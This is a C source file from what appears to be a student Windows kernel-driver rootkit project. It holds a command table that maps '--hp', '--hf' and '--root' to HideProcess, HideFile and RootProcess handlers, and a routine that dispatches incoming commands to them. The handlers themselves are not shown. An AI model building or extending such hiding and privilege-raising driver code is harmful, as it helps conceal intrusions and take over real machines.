/*
** File 	exec_command.c
** Author 	lucaze_b <alexis1.lucazeau@epitech.eu>
** Desc		Command execution routine
*/

#include <ntddk.h>
#include "driver.h"

t_command commands[] = {
	{"--hp", &HideProcess},
	{"--hf", &HideFile},
	{"--root", &RootProcess},
	{NULL, NULL}
};

NTSTATUS	ExecCommand(IN PCHAR cmd)
{
	ULONG	i;
	
	DbgPrintEx(DFLAGS, "Searching for command: %s\n", cmd);
	for (i = 0; commands[i].name != NULL; i++)
	{
		DbgPrintEx(DFLAGS, "> %s\n", commands[i].name);
		if (strncmp(commands[i].name, cmd, strlen(commands[i].name)) == 0)
		{
			DbgPrintEx(DFLAGS, "Command found:%s\n", commands[i].name);
			return (*(commands[i].exec))(cmd + strlen(commands[i].name) + 1);
		}
	}
	return (STATUS_INVALID_PARAMETER);
}
